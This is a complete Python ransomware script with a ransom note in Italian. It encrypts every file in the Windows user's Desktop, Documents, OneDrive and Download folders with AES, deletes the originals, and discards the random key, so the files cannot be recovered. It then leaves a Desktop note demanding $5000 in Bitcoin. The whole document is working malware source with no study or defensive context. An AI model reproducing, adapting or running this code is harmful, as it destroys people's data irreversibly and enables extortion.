import os
import glob
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

def generate_key(password: str) -> bytes:
    return hashlib.sha256(password.encode()).digest()


def encrypt_file(file_path: str, key: bytes):
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)

    with open(file_path, 'rb') as f:
        plaintext = f.read()

    padded_data = pad(plaintext, AES.block_size)
    ciphertext = cipher.encrypt(padded_data)

    with open(file_path + '.enc', 'wb') as f:
        f.write(iv + ciphertext)

    os.remove(file_path)


def encrypt_folder(folder_path: str, password: str):
    key = generate_key(password)
    files = glob.glob(os.path.join(folder_path, '*'))
    for file in files:
        if os.path.isfile(file):
            encrypt_file(file, key)


if __name__ == "__main__":
    folders = [
        os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop'),
        os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents'),
        os.path.join(os.path.join(os.environ['USERPROFILE']), 'OneDrive'),
        os.path.join(os.path.join(os.environ['USERPROFILE']), 'Download')
    ]
    password = get_random_bytes(32).hex()

    for folder in folders:
        encrypt_folder(folder, password)

    file_path = os.path.join(os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop'), 'uhavebeenhacked.txt')

    testo = '''
    +------------------------------------------------------+
    |                     ATTENZIONE!                      |
    |  I tuoi file sono stati criptati. Non puoi più       |
    |  accedervi, né aprirli, né modificarli.              |
    |                                                      |
    |  La sola soluzione per recuperare i tuoi dati è il   |
    |  pagamento di un riscatto.                           |
    |                                                      |
    |  La somma richiesta è: $5000 (USD) in Bitcoin.       |
    |  Una volta ricevuto il pagamento, riceverai una      |
    |  esegubile che ti permetterà di ripristinare         |
    |  i tuoi file.                                        |
    |                                                      |
    |  I dettagli per il pagamento sono i seguenti:        |
    |  Indirizzo Bitcoin: 1A2B3C4D5E6F7G8H9I0J1K2L3M4N5O   |
    +------------------------------------------------------+
    '''

    # Salva il file
    with open(file_path, 'w') as file:
        file.write(testo)